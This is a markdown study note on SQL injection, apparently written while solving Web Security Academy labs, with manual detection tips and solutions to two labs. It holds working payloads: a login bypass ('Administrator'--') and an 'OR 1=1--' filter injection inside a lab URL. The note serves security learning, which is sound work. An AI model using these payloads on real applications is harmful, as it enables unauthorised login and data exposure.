# Ethical Considerations
Remember that hacking into devices without permission is illegal and unethical.\
Always ensure you have the necessary permissions and are conducting these activities in a\
controlled environment for educational or security assessment purposes.

# Topics
## SQL injections (SQLi)

<details>
<summary style="cursor:pointer">SQLi</summary>
Manuell detection
- The single quote character ' and look for errors or other anomalies.
- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
- Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses.
- Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
- OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.
  
Alternatively and automaticly use the Burp Scanner to find the majority of SQL injection vulnerabilities.

```bash
```

## Lab: SQL injection vulnerability allowing login bypass
This lab contains a SQL injection vulnerability in the login function.
To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.

### Solution
```
Username
|------------------| > Administrator'--
Password
|------------------| (anything) gets commented out
```

## Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

### Solution
'+OR+1=1--
```
https://0a57002303b161df81053ec000a1006c.web-security-academy.net/filter?category=Lifestyle%27+OR+1=1--
```

</details>

